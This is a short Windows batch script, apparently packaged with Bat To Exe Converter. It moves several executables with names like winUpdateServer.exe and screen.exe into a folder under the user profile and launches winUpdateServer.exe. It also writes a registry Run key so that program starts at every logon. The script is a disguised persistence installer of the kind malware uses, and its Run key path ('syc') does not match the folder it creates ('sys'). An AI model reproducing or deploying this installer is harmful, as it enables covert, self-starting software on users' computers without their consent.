::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcCCnEEf6NOYgzO3o5P6IsnETRN4McYPe1KCxAu8H1krxYYY4wkZJm9kJCRUWewquDg==
::fBE1pAF6MU+EWHreyHcjLQlHcCCnEEf6NOYgzO3o5P6IsnETRN4McYPe1KCxAu8H1krxYYY4wkZPiM8NGB4WewquDg==
::fBE1pAF6MU+EWHreyHcjLQlHcCCnEEf6NOYgzO3o5P6IsnETRN4McYPe1KCxAu8H1krxYYY4wkZNkcVCDhpMHg==
::fBE1pAF6MU+EWHreyHcjLQlHcCCnEEf6NOYgzO3o5P6IsnETRN4McYPe1KCxAu8H1krxYYY4wkZNkcU5HB9ZaheYax0irHwMs3yAVw==
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFD9xYCjCDjiGIrAP4/z0/9aJsnEuXe46dpvk+LuaHO8G/lXxYao+025PiIUJFB44
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
mkdir "c:/users/%username%/sys"
move screen.exe "c:/users/%username%/sys"
move winUpdateServer.exe "c:/users/%username%/sys"
move update.exe "c:/users/%username%/sys"
move win.bat "c:/users/%username%/sys"


reg add HKEY_current_user\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v syc /t reg_sz /d "\"c:\users\%username%\syc\winUpdateServer\" -autorun" /f

cd "c:/users/%username%/sys"
start winUpdateServer.exe
